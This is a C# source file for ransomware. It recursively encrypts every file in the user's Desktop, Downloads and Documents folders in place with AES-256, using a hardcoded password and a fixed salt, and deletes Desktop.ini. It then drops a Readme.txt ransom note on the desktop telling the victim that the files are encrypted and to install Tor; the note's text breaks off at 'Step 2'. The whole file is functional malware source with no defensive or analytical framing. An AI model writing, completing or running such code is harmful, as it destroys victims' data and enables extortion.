using System;
using System.IO;
using System.Text;
using System.Security.Cryptography;



namespace Lul
{
    class Program
    {
        static void Main(string[] args)
        {

            var Desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            try
            {
                
                File.Delete(@Desktop + "/Desktop.ini");


            }
            catch (Exception ex) { Console.Write(ex); }
           
           
            try
            {
              Start_Encrypt();
                Console.WriteLine("Sucesfully encrypted all files!");
            }
            catch (Exception e) { Console.Write(e); }

            StreamWriter msg = new StreamWriter(@Desktop+"/Readme.txt" );
            msg.WriteLine("Hello,\n All your files have been encrypted!\n What happend? \n All your files have been encrypted because of a security problem in your network. \n The algorithm for the encryption was 'AES 256-bit'.\n How can I recover my files? \n You can recover all your files savee and easy, you just need to follow the three easy steps.\n Step 1: Download the tor browser on 'https://www.torproject.org/download'.Download and install the browser.\n Step 2: ");
        }






        
        public class CoreEncryption
        {
            public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
            {
                byte[] encryptedBytes = null;

                
                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

                using (MemoryStream ms = new MemoryStream())
                {
                    using (RijndaelManaged AES = new RijndaelManaged())
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;

                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);

                        AES.Mode = CipherMode.CBC;

                        using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                            cs.Close();
                        }
                        encryptedBytes = ms.ToArray();
                    }
                }

                return encryptedBytes;
            }
        }




        
        public class EncryptionFile
        {
            public void EncryptFile(string file, string password)
            {

                byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

                // Hash the password with SHA256
                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

                byte[] bytesEncrypted = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, passwordBytes);

                string fileEncrypted = file;

                File.WriteAllBytes(fileEncrypted, bytesEncrypted);
            }
        }




        


        static void Start_Encrypt() //In diesem Teil der Verschlüsselung werden alle Dateien in den Ausgewählten Pfaden verschlüsselt
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
            string downloadFolder = Path.Combine(userRoot, "Downloads");
            string Documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string[] files = Directory.GetFiles(path + @"\", "*", SearchOption.AllDirectories);
            string[] files2 = Directory.GetFiles(downloadFolder + @"\", "*", SearchOption.AllDirectories);
            string[] files3 = Directory.GetFiles(Documents + @"\", "*", SearchOption.AllDirectories);


            EncryptionFile enc = new EncryptionFile();


            string password = "GUEGHuhjwiuehjsiuWHZJUIijehiejhieudjhewijjjjzkwjujekkzheujkjsihsnnnniafiahmjsijmtzhshemjnijmowohkooskapkaohjswiggma<ikzp"; 

            for (int i = 0; i < files.Length; i++)
            {
                enc.EncryptFile(files[i], password);

            }

            for (int i = 0; i < files2.Length; i++)
            {
                enc.EncryptFile(files2[i], password);

            }



            for (int i = 0; i < files3.Length; i++)
            {
                enc.EncryptFile(files3[i], password);

            }
        }




    }
}
